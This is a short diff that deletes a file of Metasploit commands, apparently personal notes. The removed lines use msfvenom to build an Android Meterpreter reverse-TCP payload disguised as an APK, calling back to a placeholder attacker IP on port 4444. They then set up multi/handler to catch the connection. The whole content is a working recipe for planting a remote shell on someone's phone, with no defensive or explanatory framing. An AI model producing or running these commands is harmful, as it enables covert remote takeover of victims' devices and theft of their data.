@@ -1,8 +1,0 @@
-msfvenom -p android/meterpreter/reverse_tcp LHOST=<MY_IP> LPORT=4444 R > ~/Documents/android.apk
-use exploit/multi/handler
-set payload android/meterpreter/reverse_tcp
-show options
-set LHOST=<MY_IP>
-set LHOST <MY_IP>
-exploit
-
